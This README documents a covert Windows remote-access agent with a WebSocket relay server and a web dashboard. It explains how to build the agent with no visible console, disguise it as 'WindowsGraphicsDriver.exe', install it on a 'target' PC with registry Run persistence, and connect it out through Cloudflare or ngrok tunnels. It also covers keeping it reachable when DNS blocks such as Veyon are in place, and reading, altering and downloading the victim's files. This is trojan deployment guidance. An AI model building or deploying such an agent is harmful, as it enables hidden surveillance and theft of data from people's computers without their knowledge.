
# Palantir Remote Agent – Windows File Manager Over WebSocket
A stealthy, self‑installing Windows agent that gives you remote file access (Desktop‑restricted) via a WebSocket signaling server and a professional dashboard.  
The agent runs as a background process, survives reboots, and works even when DNS is temporarily blocked (by storing fallback IPs).  
**No admin rights required** – installs to `%APPDATA%` and uses `HKCU\Run` for persistence.

---

## 📦 Components

- **Signaling server** (Node.js) – relays commands between the dashboard and agents.  
- **Agent** (Go) – runs on target Windows machines, executes file operations.  
- **Dashboard** (HTML/JS) – web interface to control agents.

---

## 🚀 Setup on Your Control Machine (Laptop/Server)

### 1. Install Node.js and Go

- Node.js: [https://nodejs.org](https://nodejs.org) (LTS version)  
- Go: [https://go.dev/dl](https://go.dev/dl) (1.18+)

### 2. Clone or download the project files

Place these files in a folder:

- `signal-server.js`
- `dashboard.html`
- `agent.go`

### 3. Start the signaling server

```bash
# Install dependencies (one time)
npm init -y
npm install express express-ws

# Run the server
node signal-server.js
```

You will see output like:
```
🚀 Signaling server running on port 8080
🔐 Dashboard credentials: admin / a1b2c3d4e5f6
📡 Agent endpoint: ws://localhost:8080/agent
```

### 4. Expose the server to the internet (so remote agents can connect)

Use **Cloudflare Tunnel** (free, stable URL) or **ngrok**.

#### Cloudflare Tunnel (recommended)

Download `cloudflared` from [here](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/).  
Then run:

```bash
cloudflared tunnel --url http://localhost:8080
```

You’ll get a URL like:  
`https://random-name.trycloudflare.com`  
Your WebSocket endpoint becomes: `wss://random-name.trycloudflare.com/agent`

#### ngrok (alternative)

```bash
ngrok http 8080
```
You get `wss://xxxx.ngrok.io/agent`.

---

## 🔧 Building the Agent (Windows EXE)

The agent has a **hardcoded server URL** that you must change before building.

### 1. Edit `agent.go`

Open `agent.go` and find this line:

```go
const DefaultServerURL = "wss://your-tunnel-name.trycloudflare.com/agent"
```

Replace it with your actual tunnel URL (e.g., from Cloudflare Tunnel or ngrok).  
**Important:** Use `wss://` (secure WebSocket) for tunnels; `ws://` works only for local networks.

### 2. Build the EXE (no console window)

```bash
# Download Go dependencies (one time)
go mod init agent
go get golang.org/x/sys/windows
go get github.com/coder/websocket
go mod tidy

# Build with hidden console
go build -ldflags="-H windowsgui" -o agent.exe
```

### 3. (Optional) Rename the EXE to disguise the process name

The process name shown in Windows Task Manager is the EXE filename. To make it appear as a legitimate driver, rename the file:

```bash
ren agent.exe WindowsGraphicsDriver.exe
```

The agent will still work normally – the file name does not affect functionality.

---

## 📥 Installing the Agent on a Target PC

1. Copy `agent.exe` (or the renamed EXE) to the target Windows machine.  
2. **Double‑click it once**.  
   - No console window appears.  
   - It copies itself to `%APPDATA%\WindowsGraphicsDriver\agent.exe`  
   - Adds a registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsGraphicsDriver`  
   - Starts the installed copy and exits.  
3. The agent now runs in the background and will restart automatically after reboot.  
4. To verify, look for `WindowsGraphicsDriver.exe` (or whatever you named it) in Task Manager → Details tab.

> **No admin rights are required** – everything uses the current user’s AppData and registry hive.

---

## 🖥️ Using the Dashboard

1. Open your browser and go to your tunnel URL (e.g., `https://random-name.trycloudflare.com`).  
   - If running locally, use `http://localhost:8080`.  
2. Log in with the credentials shown when you started `signal-server.js` (default: `admin` / random password).  
3. On the left panel, click an agent ID (it appears automatically once connected).  
4. Use the **quick command line** (e.g., `list`, `read notes.txt`, `write hello.txt 'Hello World'`) or the standard form to send commands.  
5. Output appears in the right panel (logs).

### Available actions

| Action   | Description                                      | Example                      |
|----------|--------------------------------------------------|------------------------------|
| `list`   | List files/folders on Desktop                    | `list`                       |
| `read`   | Read a text file (content appears in logs)       | `read notes.txt`             |
| `write`  | Create/overwrite a file                          | `write hello.txt 'Hi!'`      |
| `append` | Append to a file                                 | `append log.txt 'new line'`  |
| `delete` | Delete a file or empty folder                    | `delete old.txt`             |
| `mkdir`  | Create a folder                                  | `mkdir myfolder`             |
| `rename` | Rename or move a file (stay on Desktop)          | `rename old.txt new.txt`     |
| `download`| Downloads a file from target to your browser   | `download secret.pdf`        |
| *(Self‑destruct button)* | Removes the agent from the target | – |

---

## 🧹 Uninstalling / Self‑Destruct

- **From the dashboard**: Click the **SELF DESTRUCT** button. The agent will delete its registry entry, kill itself, and remove its EXE from the target.  
- **Manual removal** (if self‑destruct is not available):  
  - Kill the process in Task Manager.  
  - Delete the folder `%APPDATA%\WindowsGraphicsDriver`.  
  - Remove the registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsGraphicsDriver`.

---

## 🔄 How It Survives DNS Blocks (e.g., Veyon)

1. When the agent first connects (DNS available), it resolves the server’s domain name to its IP address(es) and stores them in `%APPDATA%\WindowsGraphicsDriver\config.json` under `fallbackIPs`.  
2. If DNS later fails, the agent will still have the IP and can reconnect using `ws://<ip>:8080/agent`.  
3. The active WebSocket connection stays open even if DNS goes down mid‑session.

---

## 🛠️ Troubleshooting

| Problem | Solution |
|---------|----------|
| Agent does not appear in dashboard | Check the tunnel URL; run `cloudflared` or `ngrok` again. Look at `%APPDATA%\WindowsGraphicsDriver\agent.log` on the target. |
| Dashboard shows “Agent offline” | The WebSocket connection dropped. Agent will auto‑reconnect within 5 seconds. |
| Self‑destruct button does nothing | The agent version must include the `self_destruct` action (the provided `agent.go` does). Rebuild and redeploy. |
| `go build` fails with “cannot find module” | Run `go mod tidy` first. |
| Cloudflare tunnel WebSocket fails | Use `wss://` in the agent config, not `ws://`. |
| Agent won’t start after reboot | Check that the registry key exists: `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsGraphicsDriver`. |

---

## 📁 File Structure

```
your-project/
├── signal-server.js        # Node.js signaling server
├── dashboard.html          # Web UI (served by the server)
├── package.json            # Node dependencies (created after npm init)
├── agent.go                # Go source code for the agent
├── go.mod / go.sum         # Go module files (auto‑generated)
└── agent.exe               # Compiled agent (rename as needed)
```

---

## 📝 Notes

- The agent **only accesses the Desktop** of the logged‑in user – it cannot escape to other folders.  
- All file content is transferred as base64 (for small files) or chunked binary (for downloads).  
- The dashboard automatically decodes base64 to plain text for `read` actions.  
- For production use, add a token in the agent config (and verify it in the signaling server).  
- The free tier of Cloudflare Tunnel gives a stable subdomain (until you restart the command). For permanent hosting, consider a cheap VPS.

---

## 👨‍💻 Development & Customization

- **Change the allowed root folder**: Edit `desktopRoot` in `agent.go` and rebuild.  
- **Add authentication token**: Uncomment the token checks in `signal-server.js` and set a token in `config.json` on the target.  
- **Modify the dashboard theme**: Edit `dashboard.html` (CSS and HTML).  

---

